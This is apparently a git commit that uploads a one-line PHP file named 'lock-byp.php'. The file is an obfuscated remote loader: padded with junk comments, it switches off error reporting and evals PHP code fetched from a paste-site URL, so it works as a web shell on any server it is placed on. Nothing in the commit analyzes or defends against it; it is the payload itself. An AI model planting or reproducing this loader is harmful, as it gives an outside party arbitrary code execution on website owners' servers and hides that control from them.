e3ebff5ba5775a2407f1b8d37ae94446c26993a8
VinsenValencia <50992202+VinsenValencia@users.noreply.github.com>
2025-04-12 18:47:28 +0700

    Add files via upload

---
+++ lock-byp.php
@@ -0,0 +1,1 @@
+<?=/****/@/*55555*/null; /******/@/*55555*/error_reporting(0);/****/@/*55555*/null; /******/@/*55555*/eval/******/("?>".file_get_contents("https://clbin.com/vgc3A"))/******/ /*By Lanciau:v*/?>
